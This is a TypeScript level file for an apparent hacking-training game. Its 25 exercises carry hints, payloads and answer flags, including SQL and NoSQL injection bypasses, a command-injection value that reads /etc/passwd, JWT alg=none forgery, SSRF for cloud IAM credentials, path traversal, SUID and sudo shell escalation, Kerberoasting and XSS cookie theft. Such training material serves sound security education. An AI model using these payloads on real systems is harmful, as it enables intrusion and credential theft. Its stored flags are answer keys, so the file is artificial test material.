import { WALKTHROUGHS } from './walkthroughs';

export type LevelType = 'terminal' | 'web';

export interface WebComponentSpec {
  type: string;
  data: Record<string, any>;
}

export interface Level {
  id: string;
  title: string;
  category: string;
  description: string;
  objective: string;
  target: string;
  type: LevelType;
  flag: string;
  xp: number;
  hints: string[];
  guide?: string[];
  webComponent?: WebComponentSpec;
}

export const levels: Level[] = [
  {
    id: '1',
    title: 'Linux Recon (Log Analysis)',
    category: 'Reconnaissance',
    description:
      'A compromised application server has been writing authentication traces to /var/log/syslog. Use grep to hunt for leaked credentials and hidden flags.',
    objective: 'Find the leaked credential and the FLAG hidden in the system log.',
    target: '/var/log/syslog',
    type: 'terminal',
    flag: 'FLAG{log_watcher_2024}',
    xp: 100,
    hints: ['Try `grep password /var/log/syslog`', 'The flag follows a similar log format.'],
  },
  {
    id: '2',
    title: 'Hidden Artifacts',
    category: 'Linux Privilege Escalation',
    description:
      'Adversaries often hide secrets in dotfiles. Inspect /home/user thoroughly with ls -la and find.',
    objective: 'Locate the hidden dotfile and read the flag it contains.',
    target: '/home/user',
    type: 'terminal',
    flag: 'FLAG{dotfile_hunter_7h3_d4rk}',
    xp: 100,
    hints: ['Dotfiles start with a period', 'Use `ls -la` and `cat` the artifact.'],
  },
  {
    id: '3',
    title: 'Port Scanning',
    category: 'Network Reconnaissance',
    description:
      'Reconnaissance begins with service discovery. Scan the target 10.0.0.1 to identify the vulnerable service.',
    objective: 'Run nmap and identify the open FTP service on the target.',
    target: '10.0.0.1',
    type: 'terminal',
    flag: 'FLAG{nmap_service_discovery}',
    xp: 100,
    hints: ['Use `nmap -sV 10.0.0.1`', 'FTP services often run on port 21.'],
  },
  {
    id: '4',
    title: 'Directory Brute-Force',
    category: 'Web Reconnaissance',
    description:
      'The target web root may have an undocumented admin panel. Brute-force hidden directories.',
    objective: 'Use dirb or gobuster to discover the hidden admin panel.',
    target: 'http://target/',
    type: 'terminal',
    flag: 'FLAG{dirb_hidden_d00r}',
    xp: 100,
    hints: ['Run `dirb http://target/`', 'Look for paths containing "admin" in the output.'],
  },
  {
    id: '5',
    title: 'SQL Injection',
    category: 'Web Exploitation',
    description:
      'The login form at /login does not sanitize user input. Bypass authentication using a classic SQLi payload.',
    objective: "Submit the SQLi payload in the password field to bypass authentication.",
    target: 'http://target/login',
    type: 'web',
    flag: 'FLAG{sqli_auth_bypass}',
    xp: 100,
    hints: ["Try the payload: ' OR '1'='1", 'A tautology makes the WHERE clause always true.'],
    webComponent: {
      type: 'sqli-login',
      data: {
        url: 'http://target/login',
        fields: ['username', 'password'],
        magic: "' OR '1'='1",
      },
    },
  },
  {
    id: '6',
    title: 'IDOR',
    category: 'Web Exploitation',
    description:
      'The profile page at /profile?id=102 returns your data, but it does not enforce authorization. Access an admin account.',
    objective: 'Change the id parameter to access the first user profile.',
    target: 'http://target/profile?id=102',
    type: 'web',
    flag: 'FLAG{idor_horizontal_privesc}',
    xp: 100,
    hints: ['Try changing id=102 to id=1', 'IDs are sequential integers.'],
    webComponent: {
      type: 'idor-profile',
      data: {
        url: 'http://target/profile?id=102',
        currentId: '102',
        targetId: '1',
      },
    },
  },
  {
    id: '7',
    title: 'Cookie Tampering',
    category: 'Web Exploitation',
    description:
      'The role cookie is base64 encoded. Decode it, change your privileges, and resubmit.',
    objective: 'Modify the base64 role cookie so it decodes to "admin".',
    target: 'http://target/admin',
    type: 'web',
    flag: 'FLAG{cookie_admin_baked}',
    xp: 100,
    hints: ['Decode dXNlcg== with base64 -d', 'Re-encode admin and set the cookie.'],
    webComponent: {
      type: 'cookie-editor',
      data: {
        url: 'http://target/admin',
        cookies: [{ name: 'role', value: 'dXNlcg==' }],
        targetDecoded: 'admin',
      },
    },
  },
  {
    id: '8',
    title: 'EXIF Metadata',
    category: 'Steganography',
    description:
      'A suspicious image was uploaded to the server. Analyze its EXIF metadata for hidden GPS coordinates and comments.',
    objective: 'Run exiftool on secret.jpg and extract the flag from the comment field.',
    target: '/secret.jpg',
    type: 'terminal',
    flag: 'FLAG{exif_undercover}',
    xp: 100,
    hints: ['Use `exiftool secret.jpg`', 'The Comment field contains the flag.'],
  },
  {
    id: '9',
    title: 'Hash Cracking',
    category: 'Cryptography',
    description:
      'You recovered an MD5 hash from the database dump. Use john to recover the plaintext.',
    objective: 'Crack the MD5 in /home/user/hash.txt and submit the flag.',
    target: '/home/user/hash.txt',
    type: 'terminal',
    flag: 'FLAG{john_the_ripper_hash}',
    xp: 100,
    hints: ['Try `john /home/user/hash.txt`', 'The plaintext is one of the worst passwords.'],
  },
  {
    id: '10',
    title: 'SUID Privilege Escalation',
    category: 'Linux Privilege Escalation',
    description:
      'A binary has the SUID bit set. Find it and abuse it to drop into a root shell.',
    objective: 'Find a SUID binary with find and run vim -c \'!sh\' to get root.',
    target: '/',
    type: 'terminal',
    flag: 'FLAG{suid_vim_escalation}',
    xp: 100,
    hints: ['Use `find / -perm -4000`', 'Vim can spawn shells with `:!sh` inside -c.'],
  },
  {
    id: '11',
    title: 'Sudo Misconfiguration',
    category: 'Linux Privilege Escalation',
    description:
      'The sudoers file allows a dangerous command to run as root without a password.',
    objective: 'Check sudo permissions and abuse the allowed python3 command.',
    target: 'sudo -l',
    type: 'terminal',
    flag: 'FLAG{sudo_python_privesc}',
    xp: 100,
    hints: ['Run `sudo -l`', 'Use python3 to spawn a shell with `sudo python3 -c`'],
  },
  {
    id: '12',
    title: 'API Enumeration',
    category: 'Web API',
    description:
      'An internal API endpoint is not listed in the documentation but still responds to requests.',
    objective: 'Use curl to call the hidden internal config endpoint.',
    target: 'http://target/api/v1/internal/config',
    type: 'terminal',
    flag: 'FLAG{api_internal_exposed}',
    xp: 100,
    hints: ['Try `curl http://target/api/v1/internal/config`', 'The response is a JSON object.'],
  },
  {
    id: '13',
    title: 'FTP Anonymous Login',
    category: 'Network Exploitation',
    description:
      'An FTP server accepts anonymous authentication and hosts a juicy backup archive.',
    objective: 'Login to the FTP server and download backup.zip.',
    target: '10.0.0.5',
    type: 'terminal',
    flag: 'FLAG{ftp_anonymous_l00t}',
    xp: 100,
    hints: ['Run `ftp 10.0.0.5`', 'Login as user: anonymous, pass: anonymous, then `get backup.zip`'],
  },
  {
    id: '14',
    title: 'Command Injection',
    category: 'Web Exploitation',
    description:
      'A diagnostics page pings user-supplied IPs without validation. Inject a secondary command.',
    objective: 'Append a shell command to the ping input to dump /etc/passwd.',
    target: 'http://target/ping',
    type: 'web',
    flag: 'FLAG{cmd_injection_ping_pong}',
    xp: 100,
    hints: ['Use `;` to chain commands', 'Try `8.8.8.8; cat /etc/passwd`'],
    webComponent: {
      type: 'command-injection',
      data: {
        url: 'http://target/ping',
        payload: '8.8.8.8; cat /etc/passwd',
      },
    },
  },
  {
    id: '15',
    title: 'JWT None Algorithm',
    category: 'Web Exploitation',
    description:
      'The admin endpoint trusts JWTs signed with the "none" algorithm. Forge a token.',
    objective: 'Change the JWT header to alg=none and set admin=true in the payload.',
    target: 'http://target/api/admin',
    type: 'web',
    flag: 'FLAG{jwt_none_algorithm}',
    xp: 100,
    hints: ['Set header: {"alg":"none"}', 'Set payload: {"admin":true}'],
    webComponent: {
      type: 'jwt-editor',
      data: {
        url: 'http://target/api/admin',
        header: '{"alg":"HS256"}',
        payload: '{"admin":false,"user":"hacker"}',
      },
    },
  },
  {
    id: '16',
    title: 'Cloud Bucket Leakage',
    category: 'Cloud Security',
    description:
      'A public S3 bucket is over-sharing assets. List its contents and find the exposed secret.',
    objective: 'List the S3 bucket and retrieve the .env file.',
    target: 's3://company-public-assets/',
    type: 'terminal',
    flag: 'FLAG{s3_bucket_leak}',
    xp: 100,
    hints: ['Run `aws s3 ls s3://company-public-assets/`', 'Try `aws s3 cp s3://.../.env .`'],
  },
  {
    id: '17',
    title: 'XSS Stealer',
    category: 'Web Exploitation',
    description:
      'A comment box is vulnerable to stored XSS. Exfiltrate an admin cookie.',
    objective: 'Inject a script tag that sends document.cookie to an attacker server.',
    target: 'http://target/comments',
    type: 'web',
    flag: 'FLAG{xss_cookie_stealer}',
    xp: 100,
    hints: ['Use `<script>`', 'Reference `document.cookie` inside the script.'],
    webComponent: {
      type: 'xss-comment',
      data: {
        url: 'http://target/comments',
      },
    },
  },
  {
    id: '18',
    title: 'PCAP Analysis',
    category: 'Forensics',
    description:
      'A packet capture contains a plaintext HTTP POST with an admin password.',
    objective: 'Use strings to extract the HTTP POST data and the flag.',
    target: '/var/backups/capture.pcap',
    type: 'terminal',
    flag: 'FLAG{pcap_password_plains}',
    xp: 100,
    hints: ['Run `strings /var/backups/capture.pcap`', 'Search for the POST /login request.'],
  },
  {
    id: '19',
    title: 'SSH Key Hijack',
    category: 'Network Exploitation',
    description:
      'An unencrypted SSH private key was left in /var/backups. Use it to authenticate as root.',
    objective: 'Find the id_rsa key and run ssh -i id_rsa root@target.',
    target: 'root@target',
    type: 'terminal',
    flag: 'FLAG{ssh_key_hijack_achieved}',
    xp: 100,
    hints: ['Check /var/backups/', 'Use `ssh -i /var/backups/id_rsa root@target`'],
  },
  {
    id: '20',
    title: 'Active Directory Kerberoasting',
    category: 'Active Directory',
    description:
      'Request a TGS ticket for an SPN and crack it to recover a service account password.',
    objective: 'Use Kerberoasting to get the MSSQLService account password.',
    target: 'MSSQLService',
    type: 'terminal',
    flag: 'FLAG{kerberoasting_db_admin}',
    xp: 100,
    hints: ['Run `GetUserSPNs.py -dc-ip 10.0.0.10 -request`', 'Then crack the hash with `john`.'],
  },
  {
    id: '21',
    title: 'SSRF - Cloud Metadata',
    category: 'Cloud Security',
    description:
      'A stock-ticker proxy accepts arbitrary URLs. Force the backend to request the cloud metadata service.',
    objective:
      'Use curl to fetch the IMDS endpoint through the vulnerable proxy and leak the IAM credentials.',
    target: 'http://target/fetch?url=',
    type: 'terminal',
    flag: 'FLAG{ssrf_cloud_metadata}',
    xp: 100,
    hints: [
      'Try `curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"`',
      'Cloud metadata lives at the link-local address 169.254.169.254.',
    ],
  },
  {
    id: '22',
    title: 'XXE - XML External Entity',
    category: 'Web Exploitation',
    description:
      'An API imports XML without disabling external entities. Read internal files through XML.',
    objective:
      'Submit an XML payload with a DOCTYPE and an external entity to read /etc/passwd.',
    target: 'http://target/api/import',
    type: 'terminal',
    flag: 'FLAG{xxe_internal_leak}',
    xp: 100,
    hints: [
      'Use `curl -X POST -d "<payload>" http://target/api/import`',
      'Reference a SYSTEM entity to load file:///etc/passwd.',
    ],
  },
  {
    id: '23',
    title: 'LFI - Local File Inclusion',
    category: 'Web Exploitation',
    description:
      'A document viewer loads files based on a file parameter. Traverse directories to read system files.',
    objective:
      'Exploit path traversal in the file parameter to retrieve /etc/passwd.',
    target: 'http://target/download?file=',
    type: 'terminal',
    flag: 'FLAG{lfi_path_traversal}',
    xp: 100,
    hints: [
      'Try `curl "http://target/download?file=....//....//etc/passwd"`',
      'Use `../` or `....//` sequences to escape the webroot.',
    ],
  },
  {
    id: '24',
    title: 'NoSQL Injection',
    category: 'Web Exploitation',
    description:
      'The NoSQL login query trusts JSON operators. Bypass authentication with a JSON payload.',
    objective:
      'Send a JSON body with an operator like {"$ne": null} to bypass the login.',
    target: 'http://target/nosql-login',
    type: 'terminal',
    flag: 'FLAG{nosql_operator_bypass}',
    xp: 100,
    hints: [
      'Use `curl -X POST -H "Content-Type: application/json" -d \'{"username":{"$ne":null}}\' http://target/nosql-login`',
      'NoSQL operators start with a dollar sign.',
    ],
  },
  {
    id: '25',
    title: 'Git Repository Exposure',
    category: 'Web Reconnaissance',
    description:
      'The .git directory is left exposed on the web root. Inspect it to recover repository secrets.',
    objective:
      'Use curl to read the .git/HEAD file and discover the current branch / commit.',
    target: 'http://target/.git/HEAD',
    type: 'terminal',
    flag: 'FLAG{git_exposed_head}',
    xp: 100,
    hints: [
      'Run `curl http://target/.git/HEAD`',
      'A typical Git HEAD file contains `ref: refs/heads/<branch>`.',
    ],
  },
];

export function getLevel(id: string): Level | undefined {
  const l = levels.find((l) => l.id === id);
  return l ? { ...l, guide: WALKTHROUGHS[id] } : undefined;
}
